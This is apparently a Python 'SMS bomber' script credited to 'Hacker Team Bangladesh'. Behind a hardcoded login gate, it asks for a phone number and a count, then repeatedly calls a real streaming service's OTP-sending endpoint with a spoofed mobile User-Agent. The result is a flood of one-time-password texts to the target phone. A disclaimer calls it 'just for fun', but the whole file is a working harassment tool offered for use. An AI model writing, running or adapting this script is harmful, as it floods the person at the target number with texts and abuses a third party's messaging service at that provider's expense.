import sys
red="\033[0;31m"          # Red
color_off="\033[0m"       # Text Reset
green="\033[0;32m"        # Green


print(green+"""
$$\   $$\ $$$$$$$$\ $$$$$$$\  $$$$$$$\  
$$ |  $$ |\__$$  __|$$  __$$\ $$  __$$\ 
$$ |  $$ |   $$ |   $$ |  $$ |$$ |  $$ |
$$$$$$$$ |   $$ |   $$$$$$$\ |$$ |  $$ |
$$  __$$ |   $$ |   $$  __$$\ $$ |  $$ |
$$ |  $$ |   $$ |   $$ |  $$ |$$ |  $$ |
$$ |  $$ |   $$ |   $$$$$$$  |$$$$$$$  |
\__|  \__|   \__|   \_______/ \_______/ 

  Devolope By Hacker Team Bangladesh (Admin)

My About:
 	
Name:Easin Hosen Riju

FB Id: rb.riju1917
  
Email: hackersteambangladesh@gmail.com
 
                              Disclaimer
              --------------------------------------------
              --------------------------------------------                
 This tool is just for fun. If someone uses it in a bad way.Neither I nor my team will be responsible for it.
 -------------------------------------------------------------------------------------------------------------------------------------
                                                                                             	                                                                                                    	         
""")

usern="HTBD"
passwd="RIJU"

inpuser=str(input("Enter Your Username : "))
inppass=str(input("Enter Your Password : "))

if usern==inpuser and passwd==inppass:
	print("[√] Username And Password Correct!")
	pass
else:
  print("[×]Worng Username Or Password:")
  sys.exit()

import requests

#GET
c=requests.Session()
number=str(input('Enter Your Number :'))

api='https://www.bioscopelive.com/en/login/send-otp?phone=88'+number+'&operator=bd-otp'
ua={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1; A1603 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}
amount=int(input('Enter Your Amount: '))

for i in range(amount):
 b=c.get(api, headers=ua)
 print(str(i+1)+'.Sms Sent')
